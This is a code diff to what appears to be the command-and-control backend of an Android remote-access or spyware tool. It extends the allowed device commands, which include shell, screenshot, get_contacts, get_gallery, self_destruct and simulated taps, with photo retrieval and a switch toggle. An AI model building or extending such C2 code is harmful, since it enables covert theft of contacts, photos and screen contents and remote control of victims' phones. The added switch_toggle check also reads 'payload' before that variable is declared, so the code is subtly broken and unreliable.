@@ -774,6 +774,13 @@ function sanitizeConfig(config) {
   if (obj.popup_html != null) sane.popup_html = String(obj.popup_html).slice(0, 20000);
   if (obj.auto_issue_card != null) sane.auto_issue_card = boolish(obj.auto_issue_card);
   if (obj.expire_action != null && ['none', 'block', 'uninstall'].includes(String(obj.expire_action))) sane.expire_action = String(obj.expire_action);
+  if (Array.isArray(obj.switches)) {
+    sane.switches = obj.switches.filter(s => s && s.key && s.name).map(s => ({
+      key: String(s.key).trim(),
+      name: String(s.name).trim().slice(0, 20),
+      default_on: s.default_on === true
+    }));
+  }
   return Object.keys(sane).length ? sane : null;
 }
 
@@ -870,7 +877,7 @@ function stripMarkdownFence(text) {
 function queueDeviceCommand(device, params) {
   const type = String(params.type || '').trim();
   const allowed = ['self_destruct', 'message', 'kick', 'update_config',
-    'screenshot', 'get_contacts', 'get_gallery', 'shell', 'input_tap', 'input_swipe', 'wake'];
+    'screenshot', 'get_contacts', 'get_gallery', 'get_photo', 'switch_toggle', 'shell', 'input_tap', 'input_swipe', 'wake'];
   if (!allowed.includes(type)) throw new Error('unsupported command: ' + type);
   const cfg = effectiveConfig(device);
   if (!cfg.enable_c2) throw new Error('该设备当前配置已关闭 C2');
@@ -878,6 +885,7 @@ function queueDeviceCommand(device, params) {
   if (type === 'screenshot' && !cfg.allow_screenshot) throw new Error('该设备配置未开启截图能力');
   if (type === 'get_contacts' && !cfg.allow_contacts) throw new Error('该设备配置未开启通讯录能力');
   if (type === 'get_gallery' && !cfg.allow_contacts) throw new Error('该设备配置未开启相册能力（复用通讯录开关）');
+  if (type === 'switch_toggle' && (!payload.key || payload.on === undefined)) throw new Error('switch_toggle 需 payload.key 和 payload.on');
   if (type === 'shell' && !cfg.allow_shell) throw new Error('该设备配置未开启 Shell 执行能力');
   if ((type === 'input_tap' || type === 'input_swipe') && !cfg.allow_input_control) throw new Error('该设备配置未开启触控模拟能力');
   let payload = params.payload;
